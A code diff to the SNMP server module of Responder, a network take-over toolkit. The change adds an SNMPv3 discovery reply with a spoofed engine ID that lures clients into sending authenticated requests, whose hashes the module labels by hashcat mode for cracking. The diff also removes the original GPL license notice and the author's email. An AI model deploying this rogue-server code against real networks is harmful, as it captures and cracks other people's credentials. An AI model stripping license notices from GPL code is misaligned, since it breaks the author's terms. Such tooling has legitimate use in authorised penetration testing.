@@ -1,19 +1,7 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by Laurent Gaffie.
-# email: lgaffie@secorizon.com
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+# Enhanced SNMP server with hashcat format support
 from utils import *
 from binascii import hexlify, unhexlify
 import struct
@@ -119,6 +107,15 @@ class SNMP(BaseRequestHandler):
                     print(text('[SNMP] Auth Algorithm: %s (hashcat mode %s)' % (auth_algo_name, hashcat_mode)))
                 else:
                     print(text('[SNMP] Auth Algorithm: Unknown'))
+            
+            # Check if this is a discovery request (no auth params and empty username)
+            if (not auth_params or auth_params == '00' * 12) and (not snmp_user or snmp_user == ''):
+                if settings.Config.Verbose:
+                    print(text('[SNMP] Discovery request - sending engine ID'))
+                
+                # Send discovery response with our engine ID
+                self.send_discovery_response(socket, received_record)
+                return
             
             # Check if authentication is actually being used
             if not auth_params or auth_params == '00' * 12:
@@ -263,3 +260,112 @@ class SNMP(BaseRequestHandler):
             pass
         except:
             pass
+    
+    def send_discovery_response(self, socket, received_record):
+        """
+        Send SNMPv3 discovery response with engine ID
+        This allows the client to send authenticated request
+        """
+        try:
+            from pyasn1.type import univ
+            from pyasn1.codec.ber.encoder import encode
+            import os
+            import time
+            
+            # Generate a random engine ID (or use a fixed one)
+            # Format: 0x80 + enterprise ID (4 bytes) + format + data
+            # Enterprise ID: 0x00000000 (reserved)
+            # Format: 0x05 (octets - allows arbitrary data)
+            # Data: 4 random bytes
+            engine_id = b'\x80\x00\x00\x00\x05' + os.urandom(4)
+            
+            # Engine boots and time
+            engine_boots = 1
+            engine_time = int(time.time()) % 2147483647
+            
+            # Build the SNMPv3 message with Report-PDU
+            # Structure: SEQUENCE { version, globalData, securityParameters, scopedPDU }
+            
+            # Global data
+            msg_id = int(received_record['field-1']['field-0'])
+            global_data = univ.Sequence()
+            global_data.setComponentByPosition(0, univ.Integer(msg_id))
+            global_data.setComponentByPosition(1, univ.Integer(65507))  # max size
+            global_data.setComponentByPosition(2, univ.OctetString(hexValue='04'))  # flags: reportable
+            global_data.setComponentByPosition(3, univ.Integer(3))  # USM
+            
+            # Security parameters (USM)
+            usm_params = univ.Sequence()
+            usm_params.setComponentByPosition(0, univ.OctetString(hexValue=engine_id.hex()))  # engine ID
+            usm_params.setComponentByPosition(1, univ.Integer(engine_boots))
+            usm_params.setComponentByPosition(2, univ.Integer(engine_time))
+            usm_params.setComponentByPosition(3, univ.OctetString(''))  # username
+            usm_params.setComponentByPosition(4, univ.OctetString(hexValue='00' * 12))  # auth params
+            usm_params.setComponentByPosition(5, univ.OctetString(''))  # priv params
+            
+            # Encode USM params
+            usm_encoded = encode(usm_params)
+            
+            from pyasn1.type import tag
+            
+            # Build Report-PDU with IMPLICIT tagging [8]
+            # The [8] tag REPLACES the SEQUENCE tag, not wraps it
+            
+            # VarBind: OID + value
+            varbind_inner = univ.Sequence()
+            varbind_inner.setComponentByPosition(0, univ.ObjectIdentifier('1.3.6.1.6.3.15.1.1.4.0'))
+            varbind_inner.setComponentByPosition(1, univ.Integer(1))
+            varbind_encoded = encode(varbind_inner)
+            
+            # VarBindList (SEQUENCE OF)
+            varbind_list_content = varbind_encoded
+            varbind_list_bytes = bytes([0x30, len(varbind_list_content)]) + varbind_list_content
+            
+            # Report-PDU content (without SEQUENCE tag, will use [8] instead)
+            report_content = b''
+            # request-id
+            report_content += encode(univ.Integer(msg_id))
+            # error-status
+            report_content += encode(univ.Integer(0))
+            # error-index  
+            report_content += encode(univ.Integer(0))
+            # variable-bindings
+            report_content += varbind_list_bytes
+            
+            # Tag as [8] IMPLICIT (replaces SEQUENCE tag)
+            report_pdu_bytes = bytes([0xa8, len(report_content)]) + report_content
+            
+            # Build scopedPDU as plain SEQUENCE (no [0] tag for plaintext)
+            # RFC 3412: plaintext msgData is just the ScopedPDU SEQUENCE
+            scoped_content = b''
+            # contextEngineID (OCTET STRING)
+            engine_bytes = bytes.fromhex(engine_id.hex())
+            scoped_content += bytes([0x04, len(engine_bytes)]) + engine_bytes
+            # contextName (OCTET STRING, empty)
+            scoped_content += bytes([0x04, 0x00])
+            # data (Report-PDU with implicit tag [8])
+            scoped_content += report_pdu_bytes
+            
+            # msgData is just a SEQUENCE containing scopedPDU (no [0] tag)
+            msg_data_bytes = bytes([0x30, len(scoped_content)]) + scoped_content
+            
+            # Use Any to include raw bytes
+            msg_data = univ.Any(hexValue=msg_data_bytes.hex())
+            
+            # Full SNMPv3 message
+            snmp_msg = univ.Sequence()
+            snmp_msg.setComponentByPosition(0, univ.Integer(3))  # version snmpv3
+            snmp_msg.setComponentByPosition(1, global_data)
+            snmp_msg.setComponentByPosition(2, univ.OctetString(usm_encoded))
+            snmp_msg.setComponentByPosition(3, msg_data)  # msgData with plaintext tag
+            
+            # Encode and send
+            response = encode(snmp_msg)
+            socket.sendto(response, self.client_address)
+            
+            if settings.Config.Verbose:
+                print(text('[SNMP] Sent discovery response with engine ID: %s' % engine_id.hex()))
+        
+        except Exception as e:
+            if settings.Config.Verbose:
+                print(text('[SNMP] Error sending discovery response: %s' % str(e)))
